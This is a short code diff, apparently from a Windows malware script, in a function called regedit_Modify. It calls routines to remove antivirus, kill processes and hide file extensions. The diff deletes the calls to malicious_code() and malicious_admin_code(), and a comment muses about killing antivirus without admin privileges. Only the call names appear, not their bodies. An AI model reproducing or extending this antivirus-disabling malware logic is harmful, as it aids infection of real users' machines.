@@ -110,9 +110,8 @@ def regedit_Modify():
         remove_AV()
         hide_file_extensions(hide=True)
         kill_processes()
-        malicious_admin_code()
     else:
         remove_AV()
         kill_processes() # we can try to kill AV processes even if the user is not an admin and try sth malicious, but most likely it will not work with low privilages
-        malicious_code()
+
 
